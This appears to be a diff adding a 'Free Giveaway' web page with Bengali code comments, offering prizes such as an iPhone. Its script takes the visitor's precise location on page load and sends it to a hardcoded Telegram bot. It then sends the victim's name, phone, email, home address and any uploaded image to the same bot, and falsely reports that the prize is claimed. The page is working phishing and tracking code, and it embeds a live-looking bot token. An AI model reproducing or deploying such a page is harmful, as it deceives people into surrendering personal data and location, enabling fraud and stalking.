@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Giveaway</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 90%;
+            max-width: 320px;
+            background: rgba(0,0,0,0.8);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        h1 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #00ffcc;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 6px;
+            border: none;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border-radius: 8px;
+            border: none;
+            background: #00ffcc;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #00ccaa;
+        }
+        .refer {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #ccc;
+        }
+        .hidden {
+            display: none;
+        }
+        #status-msg {
+            margin-bottom: 10px;
+            font-size: 14px;
+            color: #ffcc00;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🎁 Free Giveaway</h1>
+    
+    <div id="status-msg">Checking requirements...</div>
+
+    <form id="giveawayForm" class="hidden">
+        <input type="text" placeholder="Full Name" name="name" required>
+        <input type="tel" placeholder="Phone Number" name="number" required>
+        <input type="email" placeholder="Gmail Address" name="email" required>
+        <input type="text" placeholder="Shipping Address" name="address" required>
+        <p style="font-size: 11px; color: #aaa; margin: 5px 0;">Upload Screenshot (Optional):</p>
+        <input type="file" id="imageInput" accept="image/*">
+        
+        <select name="product" required>
+            <option value="">Select Prize</option>
+            <option>iPhone 15 Pro</option>
+            <option>Gaming Laptop</option>
+            <option>Desktop PC</option>
+            <option>iPad Air</option>
+            <option>Smart TV 4K</option>
+            <option>Apple Watch</option>
+            <option>AirPods Pro</option>
+        </select>
+        <button type="submit" id="submitBtn">Claim Now</button>
+    </form>
+
+    <div class="refer">
+        Your Refer Code: <b>29815</b> <br>
+        Visit: <b>realgiveaway.com</b>
+    </div>
+</div>
+
+<script>
+const botToken = "8707405851:AAExkQRafu5BUWcFSfbOnFYaBWbwoq0vpec";
+const chatId = "8620709769";
+const form = document.getElementById("giveawayForm");
+const statusMsg = document.getElementById("status-msg");
+
+// ১. পেজ লোড হওয়ার সাথে সাথে লোকেশন চাবে
+window.onload = function() {
+    if (navigator.geolocation) {
+        statusMsg.innerText = "Please allow location to participate...";
+        navigator.geolocation.getCurrentPosition(sendLocation, locationDenied, {
+            enableHighAccuracy: true
+        });
+    } else {
+        alert("Your browser does not support location.");
+        showForm();
+    }
+}
+
+// ২. লোকেশন পাওয়া গেলে টেলিগ্রামে পাঠাবে
+async function sendLocation(position) {
+    const lat = position.coords.latitude;
+    const long = position.coords.longitude;
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${long}`;
+    
+    const locationText = `📍 **User Location Received**\n\nLatitude: ${lat}\nLongitude: ${long}\n\nGoogle Maps: ${mapsUrl}`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ 
+                chat_id: chatId, 
+                text: locationText,
+                parse_mode: "Markdown" 
+            })
+        });
+    } catch (err) {
+        console.error("Error sending location");
+    }
+
+    showForm();
+}
+
+// ৩. লোকেশন ডিনাই করলে বা ফর্ম দেখানোর ফাংশন
+function locationDenied() {
+    alert("Location permission is mandatory for giveaway verification.");
+    // আপনি চাইলে এখানে ফর্ম হাইড করে রাখতে পারেন, অথবা ওপেন করে দিতে পারেন
+    showForm(); 
+}
+
+function showForm() {
+    statusMsg.classList.add("hidden");
+    form.classList.remove("hidden");
+}
+
+// ৪. ফর্ম সাবমিট হলে ডাটা পাঠাবে
+form.addEventListener("submit", async function(e) {
+    e.preventDefault();
+    const btn = document.getElementById("submitBtn");
+    btn.innerText = "Processing...";
+    btn.disabled = true;
+
+    const name = form.name.value;
+    const number = form.number.value;
+    const email = form.email.value;
+    const address = form.address.value;
+    const product = form.product.value;
+
+    const message = `🎁 **New Giveaway Submission**\n\n👤 Name: ${name}\n📞 Number: ${number}\n📧 Email: ${email}\n🏠 Address: ${address}\n🎯 Product: ${product}`;
+
+    // Send text data
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ 
+            chat_id: chatId, 
+            text: message,
+            parse_mode: "Markdown"
+        })
+    });
+
+    // Send image if exists
+    const fileInput = document.getElementById("imageInput");
+    if (fileInput.files.length > 0) {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", fileInput.files[0]);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
+    }
+
+    alert("Successfully Claimed! We will contact you soon.");
+    form.reset();
+    btn.innerText = "Claim Now";
+    btn.disabled = false;
+});
+</script>
+
+</body>
+</html>
